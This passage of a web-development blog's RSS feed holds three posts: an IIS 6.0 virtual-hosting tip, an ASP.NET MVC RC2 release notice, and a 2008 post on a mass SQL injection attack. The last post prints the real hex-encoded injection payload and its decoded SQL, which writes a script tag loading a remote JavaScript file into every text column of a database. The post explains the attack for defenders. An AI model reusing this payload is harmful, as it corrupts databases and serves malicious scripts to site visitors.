+<li>A possible unfriendly server name that people have to remember or bookmark.</li>
+<li>Paths and subpaths and page names.</li>
+<li>Navigating to a single launch page, then searching for or having to click through to the desired resource.</li>
+<li>The more resources there are the more bookmarks there have to be or the longer the list of items.</li>
+<li>Conflicting page names prevent you from using the default content page for some destinations.</li>
+</ul>
+<p>There are additional problems, whether your resources are mostly on one site or not:</p>
+<ul>
+<li>A server moves or needs its name changed, so everyone has to update their URLs or change their process to find what they need.</li>
+<li>You want to combine web sites from two servers to one, or split them apart from one server to two.</li>
+</ul>
+<p>But there is a very simple and easy to implement idea that can help all this.</p>
+<h2>The Solution</h2>
+<p>Use virtual web sites with custom DNS names!</p>
+<p>Say you have a web site that everyone knows as the document repository. Choose a cool, short name for it that people will remember and isn&#8217;t hard to type. How about &#8220;repository&#8221;? Great, then. In your DNS, add &#8220;repository&#8221; as a CNAME for the current DNS name that everyone&#8217;s using (say, companyweb1). It literally takes a few seconds for a DNS admin to add an entry like this.</p>
+<p>Then, run your sites—wherever they are—using virtual hosting with the new DNS name.</p>
+<p>The finishing touch is to set the default content page correctly so the trailing &#8220;main.html&#8221; in the URL can be eliminated. Since it&#8217;s now its own site, you shouldn&#8217;t have conflicts with other sites.</p>
+<p>If you were previously using a virtual folder, you just make the new site&#8217;s root document the same folder. Some testing is a good idea because the site needs to function properly in its new location, especially links needing to use the correct name and path (but I personally think that a well-designed site could probably move over with no changes). You can actually run both the new and old access methods at the same time to do testing and ensure a smooth transition.</p>
+<p>Now getting to the resource is much more simple. People can visit your site by launching their browser and typing &#8220;repository&#8221; in the address. That&#8217;s it! Nothing else is needed. They&#8217;re in the site they want.</p>
+<h2>IIS 6.0 Virtual Hosting Instructions</h2>
+<p>You can set up virtual hosting at site setup time, or convert to using it later.</p>
+<p>At site setup time, when running the Web Site Creation Wizard, on the IP Address and Port Settings wizard page, put the desired DNS name in the &#8220;Host header for this Web site&#8221; box.</p>
+<p>To modify an existing site, get properties on it, then go to Web Site -> IP Address Advanced -> select an item in the list and Edit it -> Host Header value.</p>
+<p>Virtual hosting for other web servers or IIS versions is undoubtedly easy, you just have to look up how to do it.</p>
+<h2>A Couple More Tricks</h2>
+<p>Here are some additional ways to use virtual sites and custom DNS names.</p>
+<ul>
+<li style="margin-bottom:1em;">For all my web sites now, I put all the database connection strings for all my environments (prod/test/dev/local/etc) in a file within the site. Then the web application reads that file and uses the host header name to figure out which connection string to use. So after copying my test site to production I don&#8217;t have to change a thing! The production site connects to the production database because it was reached with the production name.
+</li>
+<li style="margin-bottom:1em;">It becomes so easy to set up those additional environments, as well. &#8220;repositoryt&#8221; or &#8220;repdev&#8221; can even be run on the same web server as the production site. Or somewhere else. No user has to know or care about that stuff.</li>
+<li>As long as you can set up the virtual hosting for the web server, you can get the site working without a DNS entry by adding the desired name to your hosts file (in Windows anyway). You can pick a completely new name, or use an existing DNS name to override it so only your computer sees a different site than others. Maybe you want to test the new site, or maybe you just want a &#8220;secret&#8221; site accessible only by someone using your computer (until someone finds the site on the web server and decides to see what it is).</li>
+</ul>
+<h2>One Gotcha</h2>
+<p>The one caveat for you is that if you are using Kerberos integrated authentication and doing delegation, where your web site is connecting over the <strong>network</strong> as the windows user visiting the web site, then you have to do some extra work with the <a href="http://www.microsoft.com/downloads/details.aspx?FamilyID=5fd831fd-ab77-46a3-9cfe-ff01d29e5c46&amp;DisplayLang=en">SetSPN Utility</a> so that the new DNS name gains the permissions of the server (under its real name).</p>
+<p>However, if you&#8217;re using NTLM integrated authentication and doing impersonation, where your web site is only accessing resources on the <strong>local</strong> web server as the visiting windows user, then you should have no problems.</p>
+<p>I hope this tip is useful to you.</p>
+<p>Erik</p>
+]]></content:encoded>
+			<wfw:commentRss>/index.php/webdev/serveradmin/intranet-makeover/feed/</wfw:commentRss>
+		<slash:comments>3</slash:comments>
+		</item>
+		<item>
+		<title>ASP.NET MVC Release Candidate 2 Has Been Released</title>
+		<link>/index.php/webdev/serveradmin/msiis/asp-net-mvc-release-candidate-2-has-been/</link>
+		<comments>/index.php/webdev/serveradmin/msiis/asp-net-mvc-release-candidate-2-has-been/#respond</comments>
+		<pubDate>Tue, 03 Mar 2009 23:48:47 +0000</pubDate>
+		<dc:creator><![CDATA[SQLDenis]]></dc:creator>
+				<category><![CDATA[AJAX]]></category>
+		<category><![CDATA[ASP.NET]]></category>
+		<category><![CDATA[Microsoft IIS]]></category>
+		<category><![CDATA[asp.net 3.5]]></category>
+		<category><![CDATA[asp.net mvc]]></category>
+		<category><![CDATA[jquery]]></category>
+
+		<guid isPermaLink="false">/index.php/2009/03/asp-net-mvc-release-candidate-2-has-been/</guid>
+		<description><![CDATA[ASP.NET MVC Release Candidate 2 is ready for download Changes Since RC 1 Anti-Forgery Helpers Support Setting Cookie Path DefaultModelBinder Validation Messages Are Now Localizable New ValidationSummary Method Overload Supports Header Message jQuery Updated to Version 1.3.1 Setup Requires .NET Framework 3.5 SP1 Download ASP.NET MVC Release Candidate 2 here: http://www.microsoft.com/downloads/details.aspx?FamilyID=ee4b2e97-8a72-449a-82d2-2f720d421031&#38;displaylang=en Release Notes: http://go.microsoft.com/fwlink/?LinkId=137662 Overview [&#8230;]]]></description>
+				<content:encoded><![CDATA[<p>ASP.NET MVC Release Candidate 2 is ready for download</p>
+<p><strong>Changes Since RC 1</strong><br />
+Anti-Forgery Helpers Support Setting Cookie Path<br />
+DefaultModelBinder Validation Messages Are Now Localizable<br />
+New ValidationSummary Method Overload Supports Header Message<br />
+jQuery Updated to Version 1.3.1<br />
+Setup Requires .NET Framework 3.5 SP1</p>
+<p>Download ASP.NET MVC Release Candidate 2 here: http://www.microsoft.com/downloads/details.aspx?FamilyID=ee4b2e97-8a72-449a-82d2-2f720d421031&amp;displaylang=en</p>
+<p>Release Notes: http://go.microsoft.com/fwlink/?LinkId=137662</p>
+<p><strong>Overview</strong><br />
+The ASP.NET MVC RC2 release provides a new Model-View-Controller (MVC) framework on top of the existing ASP.NET 3.5 runtime. This means that developers can take advantage of the MVC design patterns to create their Web Applications which includes the ability to achieve and maintain a clear separation of concerns (the UI or view from the business and application logic and backend data), as well as facilitate test driven development (TDD). The ASP.NET MVC framework defines a specific pattern to the Web Application folder structure and provides a controller base-class to handle and process requests for &#8220;actions&#8221;. Developers can take advantage of the specific Visual Studio 2008 MVC templates within this release to create their Web applications, which includes the ability to select a specific Unit Test structure to accompany their Web Application development.</p>
+<p>The MVC framework is fully extensible at all points, allowing developers to create sophisticated structures that meet their needs, including for example Dependency Injection (DI) techniques, new view rendering engines or specialized controllers.</p>
+<p>As the ASP.NET MVC framework is built on ASP.NET 3.5, developers can take advantage of many existing ASP.NET 3.5 features, such as localization, authorization, Profile etc.</p>
+]]></content:encoded>
+			<wfw:commentRss>/index.php/webdev/serveradmin/msiis/asp-net-mvc-release-candidate-2-has-been/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+		</item>
+		<item>
+		<title>Microsoft Has Released Tools To Address SQL Injection Attacks</title>
+		<link>/index.php/webdev/webdesigngraphicsstyling/microsoft-has-released-tools-to-address/</link>
+		<comments>/index.php/webdev/webdesigngraphicsstyling/microsoft-has-released-tools-to-address/#comments</comments>
+		<pubDate>Wed, 25 Jun 2008 11:37:29 +0000</pubDate>
+		<dc:creator><![CDATA[SQLDenis]]></dc:creator>
+				<category><![CDATA[Classic ASP]]></category>
+		<category><![CDATA[Microsoft IIS]]></category>
+		<category><![CDATA[Web Design, Graphics and Styling]]></category>
+
+		<guid isPermaLink="false">/index.php/2008/06/microsoft-has-released-tools-to-address/</guid>
+		<description><![CDATA[Microsoft has released 3 tools that deal with the recent SQL injection attack. These three tools include HP Scrawlr , UrlScan version 3.0 Beta , and a SQL Source Code Analysis Tool. Microsoft further recommends following the best practices found within security advisory 954462. Most of the sites affected had this submitted as part of [&#8230;]]]></description>
+				<content:encoded><![CDATA[<p>Microsoft has released 3 tools that deal with the recent SQL injection attack.<br />
+These three tools include <a href="http://www.communities.hp.com/securitysoftware/blogs/spilabs/archive/2008/06/23/finding-sql-injection-with-scrawlr.aspx">HP Scrawlr</a> , <a href="http://learn.iis.net/page.aspx/473/using-urlscan">UrlScan</a> version 3.0 Beta , and a <a href="http://support.microsoft.com/kb/954476">SQL Source Code Analysis Tool</a>. Microsoft further recommends following the best practices found within security advisory <a href="http://www.microsoft.com/technet/security/advisory/954462.mspx">954462</a>. </p>
+<p>Most of the sites affected had this submitted as part of the injection  </p>
+
+<div class="bwp-syntax-block clearfix">
+<div class="bwp-syntax-toolbar"><div class="bwp-syntax-control"><a href="javascript:;" class="bwp-syntax-source-switch" title="View Source Code"></a></div></div>
+<div class="bwp-syntax-wrapper clearfix bwp-syntax-simple"><table class="sql"><thead><tr><td colspan="2"  class="head">SQL</td></tr></thead><tbody><tr class="li1"><td class="ln"><pre class="de1">1
+2
+</pre></td><td class="de1"><pre class="de1">DECLARE%20@S%20VARCHAR<span class="br0">&#40;</span><span class="nu0">4000</span><span class="br0">&#41;</span>;SET%20@S<span class="sy0">=</span><span class="kw1">CAST</span><span class="br0">&#40;</span>0x4445434C415 245204054205641524348415228323535292C40432056415243
+4841522832353529204445434C415245205461626C655 F437572736F7220435552534F5220464F522053454C45435420612E6 E616D652C622E6E616D652046524F4D207379736F626A65637473206 12C737973636F6C756D6E73206220574845524520612E69643D622E6 96420414E4420612E78747970653D27752720414E442028622E78747 970653D3939204F5220622E78747970653D3335204F5220622E78747 970653D323331204F5220622E78747970653D31363729204F50454E2 05461626C655F437572736F72204645544348204E4558542046524F4 D205461626C655F437572736F7220494E544F2040542C40432057484 94C4528404046455443485F5354415455533D302920424547494E204 55845432827555044415445205B272B40542B275D20534554205B272 B40432B275D3D525452494D28434F4E5645525428564152434841522 834303030292C5B272B40432B275D29292B27273C736372697074207 372633D687474703A2F2F7777772E63686B626E722E636F6D2F622E6 A733E3C2F7363726970743E27272729204645544348204E455854204 6524F4D205461626C655F437572736F7220494E544F2040542C40432 0454E4420434C4F5345205461626C655F437572736F72204445414C4 C4F43415445205461626C655F437572736F7220%20AS%20VARCHAR<span class="br0">&#40;</span><span class="nu0">4000</span><span class="br0">&#41;</span><span class="br0">&#41;</span>;<span class="kw1">EXEC</span><span class="br0">&#40;</span>@S<span class="br0">&#41;</span>;</pre></td></tr></tbody></table></div>
+<div class="bwp-syntax-source"><pre class="no-parse">DECLARE%20@S%20VARCHAR(4000);SET%20@S=CAST(0x4445434C415 245204054205641524348415228323535292C40432056415243
+4841522832353529204445434C415245205461626C655 F437572736F7220435552534F5220464F522053454C45435420612E6 E616D652C622E6E616D652046524F4D207379736F626A65637473206 12C737973636F6C756D6E73206220574845524520612E69643D622E6 96420414E4420612E78747970653D27752720414E442028622E78747 970653D3939204F5220622E78747970653D3335204F5220622E78747 970653D323331204F5220622E78747970653D31363729204F50454E2 05461626C655F437572736F72204645544348204E4558542046524F4 D205461626C655F437572736F7220494E544F2040542C40432057484 94C4528404046455443485F5354415455533D302920424547494E204 55845432827555044415445205B272B40542B275D20534554205B272 B40432B275D3D525452494D28434F4E5645525428564152434841522 834303030292C5B272B40432B275D29292B27273C736372697074207 372633D687474703A2F2F7777772E63686B626E722E636F6D2F622E6 A733E3C2F7363726970743E27272729204645544348204E455854204 6524F4D205461626C655F437572736F7220494E544F2040542C40432 0454E4420434C4F5345205461626C655F437572736F72204445414C4 C4F43415445205461626C655F437572736F7220%20AS%20VARCHAR(4000));EXEC(@S);</pre></div></div>
+
+<p>This is of course done so that you can&#8217;t see the real SQL and then you can&#8217;t check for DROP, UPDATE and other DDL and DML commands </p>
+<p>So what does this look like when you replace %20 with a space and exec with print?</p>
+<pre>DECLARE Table_Cursor 
+CURSOR FOR SELECT a.name,b.name FROM sysobjects a,syscolumns b 
+WHERE a.id=b.id AND a.xtype='u' AND (b.xtype=99 OR b.xtype=35 OR b.xtype=231 OR b.xtype=167) OPEN Table_Cursor 
+FETCH NEXT FROM Table_Cursor INTO @T,@C 
+WHILE(@@FETCH_STATUS=0) 
+BEGIN 
+EXEC('UPDATE ['+@T+'] SET ['+@C+']=RTRIM(CONVERT(VARCHAR(4000),['+@C+']))+''&lt;script src=http://www.chkbnr.com/b.js&gt;&lt;/script&gt;''')
+ FETCH NEXT FROM Table_Cursor INTO @T,@C 
+END CLOSE Table_Cursor DEALLOCATE Table_Cursor  </pre>
+<p>Somehow I think this could have been written set based  <img src="https://s.w.org/images/core/emoji/2/72x72/1f642.png" alt="🙂" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>
+<p>The problem is of course that you should never ever run as dbo or even worse sa.</p>
+]]></content:encoded>
+			<wfw:commentRss>/index.php/webdev/webdesigngraphicsstyling/microsoft-has-released-tools-to-address/feed/</wfw:commentRss>
+		<slash:comments>1</slash:comments>
+		</item>
+	</channel>
+</rss>
